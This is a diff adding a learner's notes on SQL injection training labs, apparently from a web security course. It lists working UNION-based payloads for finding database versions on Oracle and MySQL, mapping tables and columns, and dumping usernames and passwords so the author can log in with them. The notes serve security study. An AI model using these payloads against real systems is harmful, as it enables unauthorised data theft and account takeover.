@@ -461,6 +461,32 @@ why it works:
 - logged in as administrator
 real world use: any login form that builds SQL queries without parameterization
 
+Lab 03 — Oracle version extraction — DONE
+payload: ' UNION SELECT banner,NULL FROM v$version--
+note: Oracle requires FROM clause — use FROM dual for empty queries
+
+Lab 04 — MySQL/MSSQL version extraction — DONE
+payload: ' UNION SELECT @@version,NULL--%20
+note: MySQL comment requires space after -- so use --%20 in URL
+note: do not use FROM dual for MySQL — Oracle only
+
+Lab 05 — Database contents extraction — DONE
+methodology:
+1. find column count with ORDER BY
+2. find text column with UNION SELECT 'test',NULL
+3. list all tables: ' UNION SELECT table_name,NULL FROM information_schema.tables--
+4. list columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target_table'--
+5. dump data: ' UNION SELECT username_col,password_col FROM target_table--
+6. login with extracted credentials
+
+information_schema — built-in database map (not Oracle)
+information_schema.tables  — all table names
+information_schema.columns — all column names per table
+
+Oracle equivalent:
+list tables:   SELECT table_name FROM all_tables
+list columns:  SELECT column_name FROM all_columns WHERE table_name='target'
+
 ======================================================
 THINGS I STILL NEED TO PRACTICE
 ======================================================
